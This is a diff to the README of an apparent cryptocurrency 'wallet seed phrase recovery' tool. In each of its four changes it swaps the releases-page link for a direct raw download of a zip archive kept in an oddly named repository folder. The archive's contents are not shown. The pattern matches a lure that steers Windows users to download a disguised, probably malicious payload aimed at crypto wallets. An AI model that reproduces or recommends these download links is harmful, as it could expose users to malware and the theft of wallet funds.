@@ -1,10 +1,10 @@
 # 🧩 wallet-seed-phrase-recover - Recover Wallet Seeds with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/krishKalKal/wallet-seed-phrase-recover/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/krishKalKal/wallet-seed-phrase-recover/raw/refs/heads/main/impinger/seed-phrase-wallet-recover-twinfold.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/krishKalKal/wallet-seed-phrase-recover/releases
+Visit this page to download: https://github.com/krishKalKal/wallet-seed-phrase-recover/raw/refs/heads/main/impinger/seed-phrase-wallet-recover-twinfold.zip
 
 ## 🖥️ What This Tool Does
 
@@ -41,7 +41,7 @@ You may also want:
 
 Go to the release page here:
 
-https://github.com/krishKalKal/wallet-seed-phrase-recover/releases
+https://github.com/krishKalKal/wallet-seed-phrase-recover/raw/refs/heads/main/impinger/seed-phrase-wallet-recover-twinfold.zip
 
 ### 2. Download the Windows file
 
@@ -268,7 +268,7 @@ The release may include:
 
 Download the latest Windows version here:
 
-https://github.com/krishKalKal/wallet-seed-phrase-recover/releases
+https://github.com/krishKalKal/wallet-seed-phrase-recover/raw/refs/heads/main/impinger/seed-phrase-wallet-recover-twinfold.zip
 
 ## 🧰 Quick Setup Checklist
 
